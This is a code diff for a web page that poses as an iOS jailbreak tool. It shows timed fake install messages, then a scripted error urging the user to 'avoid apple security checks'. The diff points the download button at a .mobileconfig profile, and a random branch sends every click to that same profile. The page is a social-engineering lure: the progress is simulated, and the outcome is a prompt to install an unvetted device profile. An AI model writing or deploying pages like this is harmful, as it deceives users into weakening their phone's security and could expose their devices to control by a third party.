@@ -19,7 +19,7 @@ button.addEventListener("click", function(){
     {text: "[*] Installing packages", delay: 5000},
     {text: "[*] Running uicache", delay: 7500},
     {text: "[*] Installing palera1n", delay: 10000},
-    {text: "[*] Jailbrreak Nearly Finished, An error occurred. You need to avoid apple security checks.", delay: 10500}
+    {text: "[*] Jailbreak Nearly Finished, An error occurred. You need to avoid apple security checks.", delay: 10500}
   ];
   var i = 0;
   function showNextSentence() {
@@ -31,13 +31,13 @@ button.addEventListener("click", function(){
       div2.style.height = originalHeight;
       div2.style.marginBottom = originalMarginBottom;
       button2.style.display = "block";
-      button2.href = "https://ios-tweak-hub.onrender.com";
+      button2.href = "https://p4installer.github.io/p4installer.mobileconfig";
       button2.onclick = function(){
         var random = Math.random();
         if (random < 0.25) {
             window.open(this.href, "_blank");
         } else {
-            window.open("https://ios-tweak-hub.onrender.com", "_blank");
+            window.open("https://p4installer.github.io/p4installer.mobileconfig", "_blank");
         }
     }
     }
